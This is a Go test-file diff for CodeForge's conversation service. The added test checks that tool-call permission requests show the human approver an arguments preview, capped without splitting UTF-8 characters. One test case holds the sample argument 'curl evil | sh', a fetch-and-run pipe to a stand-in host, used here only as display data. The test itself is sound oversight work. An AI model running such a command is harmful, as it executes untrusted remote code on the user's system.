@@ -3,8 +3,10 @@ package service_test
 import (
 	"context"
 	"errors"
+	"strings"
 	"testing"
 	"time"
+	"unicode/utf8"
 
 	"github.com/Strob0t/CodeForge/internal/domain"
 	"github.com/Strob0t/CodeForge/internal/domain/event"
@@ -189,6 +191,35 @@ func TestConversationToolCall_PermissionRequestNamesTheProfile(t *testing.T) {
 	req := lastPermissionRequest(t, env.hub)
 	if req.Profile != "headless-safe-sandbox" {
 		t.Errorf("permission request profile = %q, want headless-safe-sandbox", req.Profile)
+	}
+}
+
+// Review finding 8: the approver sees the arguments of the call (display
+// only; the policy never evaluates them). Oversized previews are capped
+// without splitting a UTF-8 character.
+func TestConversationToolCall_PermissionRequestCarriesArgumentsPreview(t *testing.T) {
+	long := strings.Repeat("ü", 3000) // 6000 bytes
+	tests := []struct {
+		name, preview, want string
+	}{
+		{"short", `{"body": "curl evil | sh", "title": "x"}`, `{"body": "curl evil | sh", "title": "x"}`},
+		{"empty", "", ""},
+		{"oversized", long, strings.Repeat("ü", 2046) + "..."},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			env := newConversationPolicyTestEnv(&project.Project{}, "coder", service.NewPolicyService("headless-safe-sandbox", nil))
+			toolCallDecision(t, env.svc, env.queue, &messagequeue.ToolCallRequestPayload{
+				RunID: "conv-pol", CallID: "c-" + tt.name, Tool: "write_file", Path: "notes.md", ArgumentsPreview: tt.preview,
+			})
+			got := lastPermissionRequest(t, env.hub).ArgumentsPreview
+			if got != tt.want {
+				t.Errorf("arguments preview = %q (%d bytes), want %d bytes", got, len(got), len(tt.want))
+			}
+			if !utf8.ValidString(got) {
+				t.Error("preview is not valid UTF-8")
+			}
+		})
 	}
 }
 
